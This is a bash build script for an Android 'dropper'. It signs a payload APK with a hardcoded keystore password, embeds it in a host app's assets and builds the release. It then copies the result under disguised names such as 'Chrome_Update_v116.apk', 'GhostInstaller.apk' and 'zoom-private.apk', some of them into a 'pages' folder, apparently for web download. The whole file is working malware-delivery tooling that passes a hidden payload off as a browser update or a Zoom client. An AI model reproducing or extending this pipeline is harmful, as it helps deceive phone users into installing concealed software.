#!/usr/bin/env bash
# Requires JDK 17, Android SDK 36 and ANDROID_HOME set.
#   ./tools/build-dropper.sh [payload.apk]
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
REPO="$(cd "$ROOT/.." && pwd)"
BT="${ANDROID_HOME:?ANDROID_HOME not set}/build-tools/36.0.0"
PAYLOAD="${1:-$REPO/pages/zoom-private-universal-release.apk}"
KS="$ROOT/release.keystore"
PASS="GhostDropper2026!"
ALIAS="ghost"

test -f "$PAYLOAD"
"$BT/aapt2" dump badging "$PAYLOAD" | grep -q "package: name='com.betterdesk.client.universal'" \
  || { echo "wrong payload package"; exit 1; }

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT
"$BT/zipalign" -f -p 4 "$PAYLOAD" "$WORK/aligned.apk"
"$BT/apksigner" sign --ks "$KS" --ks-pass "pass:$PASS" --key-pass "pass:$PASS" \
  --ks-key-alias "$ALIAS" --v1-signing-enabled true --v2-signing-enabled true \
  --v3-signing-enabled true --out "$WORK/zoom-private.apk" "$WORK/aligned.apk"
"$BT/apksigner" verify "$WORK/zoom-private.apk" >/dev/null

cp "$WORK/zoom-private.apk" "$ROOT/app/src/main/assets/zoom-private.apk"
cp "$WORK/zoom-private.apk" "$REPO/distro/clients/android/zoom-private-payload.apk"

built=0
for _ in 1 2 3; do
  if ( cd "$ROOT" && ./gradlew :app:assembleRelease --offline --warning-mode all ); then
    built=1; break
  fi
  ( cd "$ROOT" && ./gradlew --stop ) || true
  rm -rf "$ROOT/app/build/intermediates/dex"
done
test "$built" -eq 1

APK="$ROOT/app/build/outputs/apk/release/zoom-private.apk"
"$BT/apksigner" verify "$APK" >/dev/null
for name in zoom-private.apk GhostInstaller.apk Chrome_Update_v116.apk; do
  cp "$APK" "$REPO/distro/clients/android/$name"
done
cp "$APK" "$REPO/pages/zoom-private.apk"

echo "size: $(stat -c%s "$APK")"
sha256sum "$APK"
